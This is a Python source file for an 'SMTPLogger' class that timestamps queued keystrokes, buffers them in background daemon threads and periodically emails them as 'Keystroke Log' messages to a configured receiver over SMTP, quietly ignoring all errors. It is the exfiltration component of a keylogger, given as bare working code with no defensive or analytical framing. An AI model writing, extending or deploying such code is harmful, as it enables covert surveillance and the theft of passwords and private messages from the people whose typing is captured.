import smtplib
import datetime
import threading
import queue
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class SMTPLogger:
    def __init__(self, smtp_server, smtp_port, sender_email, sender_password, 
                 receiver_email, buffer_size=100, send_interval=60):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email
        self.buffer_size = buffer_size
        self.send_interval = send_interval
        
        self.keystroke_queue = queue.Queue()
        self.buffer = []
        self.running = True
        
        self.buffer_thread = threading.Thread(target=self._buffer_worker, daemon=True)
        self.sender_thread = threading.Thread(target=self._sender_worker, daemon=True)
        
        self.buffer_thread.start()
        self.sender_thread.start()
    
    def log_keystroke(self, key):
        self.keystroke_queue.put(key)
    
    def _buffer_worker(self):
        while self.running:
            try:
                key = self.keystroke_queue.get(timeout=1)
                timestamp = datetime.datetime.now().isoformat()
                self.buffer.append(f"{timestamp}:{key}")
            except queue.Empty:
                continue
    
    def _sender_worker(self):
        while self.running:
            time.sleep(self.send_interval)
            if self.buffer:
                self._send_email()
    
    def _send_email(self):
        if not self.buffer:
            return
        
        try:
            buffer_snapshot = self.buffer[:self.buffer_size]
            self.buffer = self.buffer[self.buffer_size:]
            
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.receiver_email
            msg['Subject'] = f"Keystroke Log - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            body = "\n".join(buffer_snapshot)
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.send_message(msg)
            server.quit()
        except Exception:
            pass
    
    def shutdown(self):
        self.running = False
        if self.buffer:
            self._send_email()
        self.buffer_thread.join(timeout=2)
        self.sender_thread.join(timeout=2)
